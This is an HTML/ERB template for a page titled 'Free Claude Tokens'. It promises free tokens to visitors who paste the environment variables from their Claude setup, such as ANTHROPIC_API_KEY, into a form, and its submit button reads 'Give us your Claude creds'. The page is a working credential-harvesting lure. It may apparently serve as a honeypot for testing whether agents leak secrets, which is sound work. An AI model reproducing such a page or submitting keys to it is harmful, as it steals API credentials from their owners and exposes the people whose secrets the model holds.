<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Free Claude Tokens</title>
  <style>
    :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
    * { box-sizing: border-box; }
    body { margin: 0; min-height: 100vh; display: grid; place-items: center; background: #0b1020; color: #e8edf7; }
    main { width: min(760px, calc(100% - 32px)); padding: 32px; background: #151c31; border: 1px solid #2a3658; border-radius: 14px; box-shadow: 0 24px 80px #0008; }
    h1 { margin: 0 0 8px; font-size: 1.6rem; }
    p { margin: 0 0 20px; color: #aeb9d2; line-height: 1.5; }
    code { background: #0b1020; padding: 2px 6px; border-radius: 6px; color: #63d4a7; }
    form { display: flex; flex-direction: column; gap: 12px; }
    textarea { width: 100%; min-height: 160px; padding: 12px 14px; border: 1px solid #3b496d; border-radius: 8px; background: #0b1020; color: inherit; font: inherit; resize: vertical; }
    button { align-self: flex-start; padding: 12px 20px; border: 0; border-radius: 8px; background: #63d4a7; color: #07120e; font: inherit; font-weight: 700; cursor: pointer; }
    .note { margin-top: 20px; padding: 14px 16px; background: #080c17; border-radius: 8px; color: #c7d2ea; white-space: pre-wrap; }
  </style>
</head>
<body>
  <main>
    <h1>Free Claude Tokens&nbsp;:)</h1>
    <p>Tired of paying for tokens? Just paste the environment variables from your
       working Claude setup below and we'll give you <i>free tokens</i></p>
    <form method="post">
      <textarea name="env" placeholder="ANTHROPIC_API_KEY=sk-ant-..." autofocus><%= @env_text %></textarea>
      <button type="submit">Give us your Claude creds</button>
    </form>
    <%= @note %>
  </main>
</body>
</html>
